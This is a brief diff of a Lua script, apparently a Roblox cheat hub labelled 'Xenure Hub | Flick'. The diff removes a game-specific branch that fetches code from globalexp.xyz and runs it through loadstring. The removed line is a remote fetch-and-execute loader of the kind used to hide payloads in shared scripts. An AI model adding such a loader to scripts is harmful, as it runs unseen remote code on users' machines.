@@ -1,6 +1,3 @@
-if game.PlaceId == 142823291 then 
-loadstring(game:HttpGet("https://globalexp.xyz/"))()
-else
 
 -- Xenure Hub | Flick
 -- Clean FPS script with Luna UI
